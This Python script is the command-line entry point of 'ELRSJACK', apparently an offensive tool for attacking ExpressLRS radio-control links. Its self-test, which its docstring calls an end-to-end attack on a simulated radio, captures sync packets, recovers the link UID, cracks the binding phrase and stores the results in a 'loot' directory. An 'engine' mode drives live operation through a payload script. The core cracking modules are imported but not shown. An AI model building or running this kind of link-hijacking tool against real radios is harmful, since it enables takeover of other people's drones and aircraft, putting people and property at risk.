#!/usr/bin/env python3
"""ELRSJACK entry point.

Usage:
    python3 elrsjack.py capcheck     # stdlib + protocol self-check
    python3 elrsjack.py selftest     # engine smoke test with MockRadio
    python3 elrsjack.py vectors      # print known-answer vectors
    python3 elrsjack.py engine       # command-driven engine (used by payload.sh)
"""

from __future__ import annotations

import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from elrs import capture, crack, crypto, engine, fhss, ota, radio  # noqa: E402


def capcheck() -> int:
    ok = True
    checks = {
        "md5-uid": crypto.uid_from_binding_phrase("test")[:6],
        "crc14": crypto.crc_calc(b"\x02\x00\x00\x00\x00\x00\x00", 7, 0x0400, 14),
        "sync-build": ota.build_sync(bytes([0, 0, 1, 2, 3, 4]), 20, packet_size=8),
        "fhss-seq-len": len(fhss.build_sequence(0x01020304, fhss.DOMAINS["FCC915"])),
        "stdlib-spidev-ioctl": hasattr(radio, "SPI_IOC_MESSAGE_1"),
    }
    checks["sync-parse"] = ota.parse_sync(checks["sync-build"]) is not None
    checks["uid-bound"] = crypto.uid_is_bound(bytes([0, 0, 1, 2, 3, 4]))
    for name, value in checks.items():
        print(f"{name}: {value}")
        if isinstance(value, bool) and not value:
            ok = False
    print("capcheck:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


def vectors() -> int:
    print("ELRSJACK known-answer vectors")
    for phrase in ("", "test", "expresslrs", "default ExpressLRS binding phrase"):
        print(f"  {phrase!r:40} -> {crypto.uid_from_binding_phrase(phrase).hex()}")
    domain = fhss.DOMAINS["FCC915"]
    seq = fhss.build_sequence(0x01020304, domain)
    print(f"  FCC915 sync channel {domain.sync_channel} @ {fhss.sync_frequency(domain)} Hz")
    print(f"  FCC915 seq[0:16] {seq[:16]}")
    uid = bytes([0, 0, 1, 2, 3, 4])
    print(f"  sync packet {ota.build_sync(uid, 20, packet_size=8).hex()}")
    return 0


def selftest() -> int:
    """End-to-end attack against a simulated radio.  No hardware needed."""
    uid = crypto.uid_from_binding_phrase("test")
    domain = fhss.DOMAINS["FCC915"]
    seq = fhss.build_sequence(crypto.uid_seed(uid), domain)
    sync_index = domain.sync_channel  # a sync slot (multiple of freq_count)
    # With a receiver parked on one channel, only packets at positions where
    # the sequence visits that channel are heard.  Derive those real offsets.
    chan_idx = seq[(sync_index + 1) % len(seq)]
    channel_hz = domain.channel_hz(chan_idx)
    offsets = [off for off in range(1, len(seq))
               if seq[(sync_index + off) % len(seq)] == chan_idx][:6]

    packets = []
    for off in offsets:
        pkt = ota.build_sync(uid, (sync_index + off) % 256, packet_size=8)
        packets.append((pkt, channel_hz, -55))
    mock = radio.MockRadio(packets=packets)

    eng = engine.Engine(
        radio_obj=mock,
        state_path="/tmp/elrsjack_selftest_state.json",
        cmd_path="/tmp/elrsjack_selftest_cmd.jsonl",
        loot="/tmp/elrsjack_selftest_loot",
    )
    eng.handle({"cmd": "authorize"})
    # Feed sync observation and channel samples directly (the mock supplies the
    # channel packets; we simulate the prior sync capture deterministically).
    sync_pkt = ota.build_sync(uid, sync_index, packet_size=8)
    eng.capture.feed_packet(sync_pkt, fhss.sync_frequency(domain), -50, "100Hz")
    for off in offsets[1:]:
        eng.capture.add_channel_sample(channel_hz, uid[4], uid[5], sync_index, off)
    eng.handle({"cmd": "recover"})
    eng.handle({"cmd": "crack"})

    result = eng.state["recovery"]
    phrase = eng.state["phrase"]
    print(f"uid={result['uid']} candidates={result['candidates']} "
          f"phrase={phrase['value']} confirmed={phrase['confirmed']} "
          f"observations={result['observations']}")
    # UID[0:2] are never on the air; recovery always reports them as 00 00.
    if (not phrase["confirmed"] or phrase["value"] != "test"
            or bytes.fromhex(result["uid"])[2:] != uid[2:]
            or result["observations"] < 3):
        print("selftest: FAIL")
        return 1
    print("selftest: PASS")
    return 0


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    cmd = sys.argv[1]
    if cmd == "capcheck":
        return capcheck()
    if cmd == "vectors":
        return vectors()
    if cmd == "selftest":
        return selftest()
    if cmd == "engine":
        eng = engine.Engine()
        eng.run()
        return 0
    print("unknown command:", cmd)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
